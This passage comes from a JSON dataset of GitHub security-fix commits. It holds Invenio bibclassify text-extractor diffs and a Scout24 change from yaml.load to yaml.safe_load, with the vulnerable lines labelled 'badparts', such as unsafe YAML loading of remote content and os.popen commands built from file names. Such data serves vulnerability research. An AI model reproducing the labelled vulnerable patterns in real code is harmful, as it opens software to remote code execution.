:var spires: boolean, True=generate spires output - BUT NOTE: it is\n            here only not to break compatibility, in fact spires output\n            should never be used for xml because if we read marc back\n            into the KeywordToken objects, we would not find them\n    :keyword provenience: string that identifies source (authority) that\n        assigned the contents of the field\n    :return: string, formatted MARC\"\"\"\n\n    kw_template = ('<datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">\\n'\n                   '    <subfield code=\"2\">%s</subfield>\\n'\n                   '    <subfield code=\"a\">%s</subfield>\\n'\n                   '    <subfield code=\"n\">%s</subfield>\\n'\n                   '    <subfield code=\"9\">%s</subfield>\\n'\n                   '</datafield>\\n')\n\n    output = []\n\n    tag, ind1, ind2 = _parse_marc_code(kw_field)\n    for keywords in (output_complete[\"Single keywords\"], output_complete[\"Core keywords\"]):\n        for kw in keywords:\n            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                         encode_for_xml(kw), keywords[kw],\n                                         encode_for_xml(categories[kw])))\n\n    for field, keywords in ((auth_field, output_complete[\"Author keywords\"]),\n                            (acro_field, output_complete[\"Acronyms\"])):\n        if keywords and len(keywords) and field:  # field='' we shall not save the keywords\n            tag, ind1, ind2 = _parse_marc_code(field)\n            for kw, info in keywords.items():\n                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),\n                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))\n\n    return \"\".join(output)\n\n\ndef _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,\n                     acronyms=None, spires=False, only_core_tags=False,\n                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):\n\n    if limit:\n        resized_skw = skw_matches[0:limit]\n        resized_ckw = ckw_matches[0:limit]\n    else:\n        resized_skw = skw_matches\n        resized_ckw = ckw_matches\n\n    results = {\"Core keywords\": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}\n\n    if not only_core_tags:\n        results[\"Author keywords\"] = _get_author_keywords(author_keywords, spires=spires)\n        results[\"Composite keywords\"] = _get_compositekws(resized_ckw, spires=spires)\n        results[\"Single keywords\"] = _get_singlekws(resized_skw, spires=spires)\n        results[\"Field codes\"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)\n        results[\"Acronyms\"] = _get_acronyms(acronyms)\n\n    return results\n\n\ndef _output_dict(complete_output, categories):\n    return {\n        \"complete_output\": complete_output,\n        \"categories\": categories\n    }\n\n\ndef _output_text(complete_output, categories):\n    \"\"\"Output the results obtained in text format.\n\n\n    :return: str, html formatted output\n    \"\"\"\n    output = \"\"\n\n    for result in complete_output:\n        list_result = complete_output[result]\n        if list_result:\n            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],\n                                        reverse=True)\n            output += \"\\n\\n{0}:\\n\".format(result)\n            for element in list_result_sorted:\n                output += \"\\n{0} {1}\".format(list_result[element], element)\n\n    output += \"\\n--\\n{0}\".format(_signature())\n\n    return output\n\n\ndef _output_html(complete_output, categories):\n    \"\"\"Output the same as txt output does, but HTML formatted.\n\n    :var skw_matches: sorted list of single keywords\n    :var ckw_matches: sorted list of composite keywords\n    :var author_keywords: dictionary of extracted author keywords\n    :var acronyms: dictionary of acronyms\n    :var spires: boolean\n    :var only_core_tags: boolean\n    :keyword limit: int, number of printed keywords\n    :return: str, html formatted output\n    \"\"\"\n    return \"\"\"<html>\n    <head>\n      <title>Automatically generated keywords by bibclassify</title>\n    </head>\n    <body>\n    {0}\n    </body>\n    </html>\"\"\".format(\n        _output_text(complete_output).replace('\\n', '<br>')\n    ).replace('\\n', '')\n\n\ndef _get_singlekws(skw_matches, spires=False):\n    \"\"\"\n    :var skw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for single_keyword, info in skw_matches:\n        output[single_keyword.output(spires)] = len(info[0])\n    return output\n\n\ndef _get_compositekws(ckw_matches, spires=False):\n    \"\"\"\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: list of formatted keywords\n    \"\"\"\n    output = {}\n    for composite_keyword, info in ckw_matches:\n        output[composite_keyword.output(spires)] = {\"numbers\": len(info[0]),\n                                                    \"details\": info[1]}\n    return output\n\n\ndef _get_acronyms(acronyms):\n    \"\"\"Return a formatted list of acronyms.\"\"\"\n    acronyms_str = {}\n    if acronyms:\n        for acronym, expansions in iteritems(acronyms):\n            expansions_str = \", \".join([\"%s (%d)\" % expansion\n                                        for expansion in expansions])\n            acronyms_str[acronym] = expansions_str\n\n    return acronyms\n\n\ndef _get_author_keywords(author_keywords, spires=False):\n    \"\"\"Format the output for the author keywords.\n\n    :return: list of formatted author keywors\n    \"\"\"\n    out = {}\n    if author_keywords:\n        for keyword, matches in author_keywords.items():\n            skw_matches = matches[0]  # dictionary of single keywords\n            ckw_matches = matches[1]  # dict of composite keywords\n            matches_str = []\n            for ckw, spans in ckw_matches.items():\n                matches_str.append(ckw.output(spires))\n            for skw, spans in skw_matches.items():\n                matches_str.append(skw.output(spires))\n            if matches_str:\n                out[keyword] = matches_str\n            else:\n                out[keyword] = 0\n\n    return out\n\n\ndef _get_fieldcodes(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: string\"\"\"\n    fieldcodes = {}\n    output = {}\n\n    for skw, _ in skw_matches:\n        for fieldcode in skw.fieldcodes:\n            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))\n    for ckw, _ in ckw_matches:\n\n        if len(ckw.fieldcodes):\n            for fieldcode in ckw.fieldcodes:\n                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))\n        else:  # inherit field-codes from the composites\n            for kw in ckw.getComponents():\n                for fieldcode in kw.fieldcodes:\n                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))\n                    fieldcodes.setdefault('*', set()).add(kw.output(spires))\n\n    for fieldcode, keywords in fieldcodes.items():\n        output[fieldcode] = ', '.join(keywords)\n\n    return output\n\n\ndef _get_core_keywords(skw_matches, ckw_matches, spires=False):\n    \"\"\"Return the output for the field codes.\n\n    :var skw_matches: dict of {keyword: [info,...]}\n    :var ckw_matches: dict of {keyword: [info,...]}\n    :keyword spires: bool, to get the spires output\n    :return: set of formatted core keywords\n    \"\"\"\n    output = {}\n    category = {}\n\n    def _get_value_kw(kw):\n        \"\"\"Help to sort the Core keywords.\"\"\"\n        i = 0\n        while kw[i].isdigit():\n            i += 1\n        if i > 0:\n            return int(kw[:i])\n        else:\n            return 0\n\n    for skw, info in skw_matches:\n        if skw.core:\n            output[skw.output(spires)] = len(info[0])\n            category[skw.output(spires)] = skw.type\n    for ckw, info in ckw_matches:\n        if ckw.core:\n            output[ckw.output(spires)] = len(info[0])\n        else:\n            #test if one of the components is  not core\n            i = 0\n            for c in ckw.getComponents():\n                if c.core:\n                    output[c.output(spires)] = info[1][i]\n                i += 1\n    return output\n\n\ndef _filter_core_keywors(keywords):\n    matches = {}\n    for kw, info in keywords.items():\n        if kw.core:\n            matches[kw] = info\n    return matches\n\n\ndef _signature():\n    \"\"\"Print out the bibclassify signature.\n\n    #todo: add information about taxonomy, rdflib\"\"\"\n\n    return 'bibclassify v%s' % (bconfig.VERSION,)\n\n\ndef clean_before_output(kw_matches):\n    \"\"\"Return a clean copy of the keywords data structure.\n\n    Stripped off the standalone and other unwanted elements\"\"\"\n    filtered_kw_matches = {}\n\n    for kw_match, info in iteritems(kw_matches):\n        if not kw_match.nostandalone:\n            filtered_kw_matches[kw_match] = info\n\n    return filtered_kw_matches\n\n# ---------------------------------------------------------------------\n#                          helper functions\n# ---------------------------------------------------------------------\n\n\ndef _skw_matches_comparator(kw0, kw1):\n    \"\"\"\n    Compare 2 single keywords objects.\n\n    First by the number of their spans (ie. how many times they were found),\n    if it is equal it compares them by lenghts of their labels.\n    \"\"\"\n    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))\n    if list_comparison:\n        return list_comparison\n\n    if kw0[0].isComposite() and kw1[0].isComposite():\n        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])\n        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])\n        component_comparison = cmp(component_avg1, component_avg0)\n        if component_comparison:\n            return component_comparison\n\n    return cmp(len(str(kw1[0])), len(str(kw0[0])))\n\n\ndef _kw(keywords):\n    \"\"\"Turn list of keywords into dictionary.\"\"\"\n    r = {}\n    for k, v in keywords:\n        r[k] = v\n    return r\n\n\ndef _sort_kw_matches(skw_matches, limit=0):\n    \"\"\"Return a resized version of keywords to the given length.\"\"\"\n    sorted_keywords = list(skw_matches.items())\n    sorted_keywords.sort(_skw_matches_comparator)\n    return limit and sorted_keywords[:limit] or sorted_keywords\n\n\ndef _get_partial_text(fulltext):\n    \"\"\"\n    Return a short version of the fulltext used with the partial matching mode.\n\n    The version is composed of 20% in the beginning and 20% in the middle of the\n    text.\"\"\"\n    length = len(fulltext)\n\n    get_index = lambda x: int(float(x) / 100 * length)\n\n    partial_text = [fulltext[get_index(start):get_index(end)]\n                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]\n\n    return \"\\n\".join(partial_text)\n\n\ndef save_keywords(filename, xml):\n    tmp_dir = os.path.dirname(filename)\n    if not os.path.isdir(tmp_dir):\n        os.mkdir(tmp_dir)\n\n    file_desc = open(filename, \"w\")\n    file_desc.write(xml)\n    file_desc.close()\n\n\ndef get_tmp_file(recid):\n    tmp_directory = \"%s/bibclassify\" % bconfig.CFG_TMPDIR\n    if not os.path.isdir(tmp_directory):\n        os.mkdir(tmp_directory)\n    filename = \"bibclassify_%s.xml\" % recid\n    abs_path = os.path.join(tmp_directory, filename)\n    return abs_path\n\n\ndef _parse_marc_code(field):\n    \"\"\"Parse marc field and return default indicators if not filled in.\"\"\"\n    field = str(field)\n    if len(field) < 4:\n        raise Exception('Wrong field code: %s' % field)\n    else:\n        field += '__'\n    tag = field[0:3]\n    ind1 = field[3].replace('_', '')\n    ind2 = field[4].replace('_', '')\n    return tag, ind1, ind2\n\n\nif __name__ == \"__main__\":\n    log.error(\"Please use bibclassify_cli from now on.\")\n"}, "/invenio/legacy/bibclassify/ontology_reader.py": {"changes": [{"diff": "\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"", "add": 2, "remove": 3, "filename": "/invenio/legacy/bibclassify/ontology_reader.py", "badparts": ["            except TaxonomyError:", "                log.error(", "                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')"], "goodparts": ["            except TaxonomyError as err:", "                log.error(err)"]}]}, "/invenio/legacy/bibclassify/text_extractor.py": {"changes": [{"diff": "\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["\"\"\"", "BibClassify text extractor."], "goodparts": ["\"\"\"BibClassify text extractor."]}, {"diff": "\n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["import tempfile", "import urllib2"], "goodparts": []}, {"diff": "\n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\""], "goodparts": ["    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\""]}, {"diff": "\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n", "add": 5, "remove": 5, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["        filetype = file_output.split(\":\")[1]", "                  \"be unsupported. Please report this to cds.support@cern.ch.\")", "    \"\"\"Returns the fulltext of the local file."], "goodparts": ["        filetype = file_output.split(\":\")[-1]", "                  \"be unsupported.\")", "    \"\"\"Return the fulltext of the local file."]}, {"diff": "\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "add": 2, "remove": 74, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    if not _is_english_text('\\n'.join(lines)):", "        log.warning(\"It seems the file '%s' is unvalid and doesn't \"", "                    \"contain text. Please communicate this file to the Invenio \"", "                    \"team.\" % document)", "    line_nb = len(lines)", "    word_nb = 0", "    for line in lines:", "        word_nb += len(re.findall(\"\\S+\", line))", "    lines = [line for line in lines if _ONE_WORD.search(line) is not None]", "    if not remote:", "        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))", "    return lines", "def _is_english_text(text):", "    \"\"\"", "    Checks if a text is correct english.", "    Computes the number of words in the text and compares it to the", "    expected number of words (based on an average size of words of 5.1", "    letters).", "    @param text_lines: the text to analyze", "    @type text_lines:  string", "    @return:           True if the text is English, False otherwise", "    @rtype:            Boolean", "    \"\"\"", "    avg_word_length = 2.55 + 1", "    expected_word_number = float(len(text)) / avg_word_length", "    words = [word", "             for word in re.split('\\W', text)", "             if word.isalpha()]", "    word_number = len(words)", "    return word_number > expected_word_number", "def text_lines_from_url(url, user_agent=\"\"):", "    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"", "    request = urllib2.Request(url)", "    if user_agent:", "        request.add_header(\"User-Agent\", user_agent)", "    try:", "        distant_stream = urlopen(request)", "        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]", "        local_stream = open(local_file, \"w\")", "        local_stream.write(distant_stream.read())", "        local_stream.close()", "    except:", "        log.error(\"Unable to read from URL %s.\" % url)", "        return None", "    else:", "        lines = text_lines_from_local_file(local_file, remote=True)", "        os.remove(local_file)", "        line_nb = len(lines)", "        word_nb = 0", "        for line in lines:", "            word_nb += len(re.findall(\"\\S+\", line))", "        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))", "        return lines", "    \"\"\"Tests if an executable is available on the system.\"\"\""], "goodparts": ["    return [line for line in lines if _ONE_WORD.search(line) is not None]", "    \"\"\"Test if an executable is available on the system.\"\"\""]}], "source": "\n \"\"\" BibClassify text extractor. This module provides method to extract the fulltext from local or remote documents. Currently 2 formats of documents are supported: PDF and text documents. 2 methods provide the functionality of the module: text_lines_from_local_file and text_lines_from_url. This module also provides the utility 'is_pdf' that uses GNU file in order to determine if a local file is a PDF file. This module is STANDALONE safe \"\"\" import os import re import tempfile import urllib2 from invenio.legacy.bibclassify import config as bconfig if bconfig.STANDALONE: from urllib2 import urlopen else: from invenio.utils.url import make_invenio_opener urlopen=make_invenio_opener('BibClassify').open log=bconfig.get_logger(\"bibclassify.text_extractor\") _ONE_WORD=re.compile(\"[A-Za-z]{2,}\") def is_pdf(document): \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\" if not executable_exists('pdftotext'): log.warning(\"GNU file was not found on the system. \" \"Switching to a weak file extension test.\") if document.lower().endswith(\".pdf\"): return True return False file_output=os.popen('file ' +re.escape(document)).read() try: filetype=file_output.split(\":\")[1] except IndexError: log.error(\"Your version of the 'file' utility seems to \" \"be unsupported. Please report this to cds.support@cern.ch.\") raise Exception('Incompatible pdftotext') pdf=filetype.find(\"PDF\") > -1 return pdf def text_lines_from_local_file(document, remote=False): \"\"\"Returns the fulltext of the local file. @var document: fullpath to the file that should be read @var remote: boolean, if True does not count lines(gosh!) @return: list of lines if st was read or an empty list\"\"\" try: if is_pdf(document): if not executable_exists(\"pdftotext\"): log.error(\"pdftotext is not available on the system.\") cmd=\"pdftotext -q -enc UTF-8 %s -\" % re.escape(document) filestream=os.popen(cmd) else: filestream=open(document, \"r\") except IOError as ex1: log.error(\"Unable to read from file %s.(%s)\" %(document, ex1.strerror)) return[] lines=[line.decode(\"utf-8\", 'replace') for line in filestream] filestream.close() if not _is_english_text('\\n'.join(lines)): log.warning(\"It seems the file '%s' is unvalid and doesn't \" \"contain text. Please communicate this file to the Invenio \" \"team.\" % document) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) lines=[line for line in lines if _ONE_WORD.search(line) is not None] if not remote: log.info(\"Local file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def _is_english_text(text): \"\"\" Checks if a text is correct english. Computes the number of words in the text and compares it to the expected number of words(based on an average size of words of 5.1 letters). @param text_lines: the text to analyze @type text_lines: string @return: True if the text is English, False otherwise @rtype: Boolean \"\"\" avg_word_length=2.55 +1 expected_word_number=float(len(text)) / avg_word_length words=[word for word in re.split('\\W', text) if word.isalpha()] word_number=len(words) return word_number > expected_word_number def text_lines_from_url(url, user_agent=\"\"): \"\"\"Returns the fulltext of the file found at the URL.\"\"\" request=urllib2.Request(url) if user_agent: request.add_header(\"User-Agent\", user_agent) try: distant_stream=urlopen(request) local_file=tempfile.mkstemp(prefix=\"bibclassify.\")[1] local_stream=open(local_file, \"w\") local_stream.write(distant_stream.read()) local_stream.close() except: log.error(\"Unable to read from URL %s.\" % url) return None else: lines=text_lines_from_local_file(local_file, remote=True) os.remove(local_file) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) log.info(\"Remote file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def executable_exists(executable): \"\"\"Tests if an executable is available on the system.\"\"\" for directory in os.getenv(\"PATH\").split(\":\"): if os.path.exists(os.path.join(directory, executable)): return True return False ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\n\"\"\"\nBibClassify text extractor.\n\nThis module provides method to extract the fulltext from local or remote\ndocuments. Currently 2 formats of documents are supported: PDF and text\ndocuments.\n\n2 methods provide the functionality of the module: text_lines_from_local_file\nand text_lines_from_url.\n\nThis module also provides the utility 'is_pdf' that uses GNU file in order to\ndetermine if a local file is a PDF file.\n\nThis module is STANDALONE safe\n\"\"\"\n\nimport os\nimport re\nimport tempfile\nimport urllib2\nfrom invenio.legacy.bibclassify import config as bconfig\n\nif bconfig.STANDALONE:\n    from urllib2 import urlopen\nelse:\n    from invenio.utils.url import make_invenio_opener\n\n    urlopen = make_invenio_opener('BibClassify').open\n\nlog = bconfig.get_logger(\"bibclassify.text_extractor\")\n\n_ONE_WORD = re.compile(\"[A-Za-z]{2,}\")\n\n\ndef is_pdf(document):\n    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n    if not executable_exists('pdftotext'):\n        log.warning(\"GNU file was not found on the system. \"\n                    \"Switching to a weak file extension test.\")\n        if document.lower().endswith(\".pdf\"):\n            return True\n        return False\n        # Tested with file version >= 4.10. First test is secure and works\n    # with file version 4.25. Second condition is tested for file\n    # version 4.10.\n    file_output = os.popen('file ' + re.escape(document)).read()\n    try:\n        filetype = file_output.split(\":\")[1]\n    except IndexError:\n        log.error(\"Your version of the 'file' utility seems to \"\n                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n        raise Exception('Incompatible pdftotext')\n\n    pdf = filetype.find(\"PDF\") > -1\n    # This is how it should be done however this is incompatible with\n    # file version 4.10.\n    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n    return pdf\n\n\ndef text_lines_from_local_file(document, remote=False):\n    \"\"\"Returns the fulltext of the local file.\n    @var document: fullpath to the file that should be read\n    @var remote: boolean, if True does not count lines (gosh!)\n    @return: list of lines if st was read or an empty list\"\"\"\n\n    try:\n        if is_pdf(document):\n            if not executable_exists(\"pdftotext\"):\n                log.error(\"pdftotext is not available on the system.\")\n            cmd = \"pdftotext -q -enc UTF-8 %s -\" % re.escape(document)\n            filestream = os.popen(cmd)\n        else:\n            filestream = open(document, \"r\")\n    except IOError as ex1:\n        log.error(\"Unable to read from file %s. (%s)\" % (document, ex1.strerror))\n        return []\n\n    # FIXME - we assume it is utf-8 encoded / that is not good\n    lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n    filestream.close()\n\n    if not _is_english_text('\\n'.join(lines)):\n        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n                    \"contain text. Please communicate this file to the Invenio \"\n                    \"team.\" % document)\n\n    line_nb = len(lines)\n    word_nb = 0\n    for line in lines:\n        word_nb += len(re.findall(\"\\S+\", line))\n\n    # Discard lines that do not contain at least one word.\n    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n\n    if not remote:\n        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n\n    return lines\n\n\ndef _is_english_text(text):\n    \"\"\"\n    Checks if a text is correct english.\n    Computes the number of words in the text and compares it to the\n    expected number of words (based on an average size of words of 5.1\n    letters).\n\n    @param text_lines: the text to analyze\n    @type text_lines:  string\n    @return:           True if the text is English, False otherwise\n    @rtype:            Boolean\n    \"\"\"\n    # Consider one word and one space.\n    avg_word_length = 2.55 + 1\n    expected_word_number = float(len(text)) / avg_word_length\n\n    words = [word\n             for word in re.split('\\W', text)\n             if word.isalpha()]\n\n    word_number = len(words)\n\n    return word_number > expected_word_number\n\n\ndef text_lines_from_url(url, user_agent=\"\"):\n    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n    request = urllib2.Request(url)\n    if user_agent:\n        request.add_header(\"User-Agent\", user_agent)\n    try:\n        distant_stream = urlopen(request)\n        # Write the URL content to a temporary file.\n        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n        local_stream = open(local_file, \"w\")\n        local_stream.write(distant_stream.read())\n        local_stream.close()\n    except:\n        log.error(\"Unable to read from URL %s.\" % url)\n        return None\n    else:\n        # Read lines from the temporary file.\n        lines = text_lines_from_local_file(local_file, remote=True)\n        os.remove(local_file)\n\n        line_nb = len(lines)\n        word_nb = 0\n        for line in lines:\n            word_nb += len(re.findall(\"\\S+\", line))\n\n        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n\n        return lines\n\n\ndef executable_exists(executable):\n    \"\"\"Tests if an executable is available on the system.\"\"\"\n    for directory in os.getenv(\"PATH\").split(\":\"):\n        if os.path.exists(os.path.join(directory, executable)):\n            return True\n    return False\n\n\n"}}, "msg": "classifier: support colons in file paths\n\n* FIX Properly handles file paths containing a colon (:), avoiding\n  bad text extraction that causes (1) wrong results and (2) much slower\n  execution.\n\n* Improves the reporting of problems in the ontology.\n\n* Removes check if PDF text is English as it is irrelevant.\n\n* Refactors a bit the code to download remote files.\n\nSigned-off-by: Jan Aage Lavik <jan.age.lavik@cern.ch>"}}, "https://github.com/Scout24/monitoring-config-generator": {"2191fe6c5a850ddcf7a78f7913881cef1677500d": {"url": "https://api.github.com/repos/Scout24/monitoring-config-generator/commits/2191fe6c5a850ddcf7a78f7913881cef1677500d", "html_url": "https://github.com/Scout24/monitoring-config-generator/commit/2191fe6c5a850ddcf7a78f7913881cef1677500d", "sha": "2191fe6c5a850ddcf7a78f7913881cef1677500d", "keyword": "remote code execution prevent", "diff": "diff --git a/src/main/python/monitoring_config_generator/yaml_tools/readers.py b/src/main/python/monitoring_config_generator/yaml_tools/readers.py\nindex 645ab0f..50888cf 100644\n--- a/src/main/python/monitoring_config_generator/yaml_tools/readers.py\n+++ b/src/main/python/monitoring_config_generator/yaml_tools/readers.py\n@@ -57,7 +57,7 @@ def get_from_header(field):\n         return response.headers[field] if field in response.headers else None\n \n     if response.status_code == 200:\n-        yaml_config = yaml.load(response.content)\n+        yaml_config = yaml.safe_load(response.content)\n         etag = get_from_header('etag')\n         mtime = get_from_header('last-modified')\n         mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n", "message": "", "files": {"/src/main/python/monitoring_config_generator/yaml_tools/readers.py": {"changes": [{"diff": "\n         return response.headers[field] if field in response.headers else None\n \n     if response.status_code == 200:\n-        yaml_config = yaml.load(response.content)\n+        yaml_config = yaml.safe_load(response.content)\n         etag = get_from_header('etag')\n         mtime = get_from_header('last-modified')\n         mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n", "add": 1, "remove": 1, "filename": "/src/main/python/monitoring_config_generator/yaml_tools/readers.py", "badparts": ["        yaml_config = yaml.load(response.content)"], "goodparts": ["        yaml_config = yaml.safe_load(response.content)"]}], "source": "\nimport datetime import os import os.path import urlparse import socket from time import localtime, strftime, time from requests.exceptions import RequestException, ConnectionError, Timeout import requests import yaml from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, HostUnreachableException from monitoring_config_generator.yaml_tools.merger import merge_yaml_files def is_file(parsed_uri): return parsed_uri.scheme in['', 'file'] def is_host(parsed_uri): return parsed_uri.scheme in['http', 'https'] def read_config(uri): uri_parsed=urlparse.urlparse(uri) if is_file(uri_parsed): return read_config_from_file(uri_parsed.path) elif is_host(uri_parsed): return read_config_from_host(uri) else: raise ValueError('Given url was not acceptable %s' % uri) def read_config_from_file(path): yaml_config=merge_yaml_files(path) etag=None mtime=os.path.getmtime(path) return yaml_config, Header(etag=etag, mtime=mtime) def read_config_from_host(url): try: response=requests.get(url) except socket.error as e: msg=\"Could not open socket for '%s', error: %s\" 